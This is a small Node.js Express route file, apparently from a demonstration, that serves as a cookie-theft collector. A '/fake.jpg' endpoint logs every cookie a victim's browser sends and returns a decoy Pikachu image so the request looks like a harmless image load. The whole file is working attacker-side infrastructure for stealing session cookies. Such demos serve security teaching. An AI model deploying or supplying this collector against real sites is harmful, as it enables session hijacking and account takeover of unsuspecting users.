var express = require('express');
var router = express.Router();

router.get('/fake.jpg', function(req, res, next) {
  console.log('\n\nCookie received by cookie theft:');
  console.log(JSON.stringify(req.cookies, null, 2), '\n\n');
  // res.send('Your cookie is parsed :)');
  res.sendfile('public/images/pikachu.jpg');
});

module.exports = router;
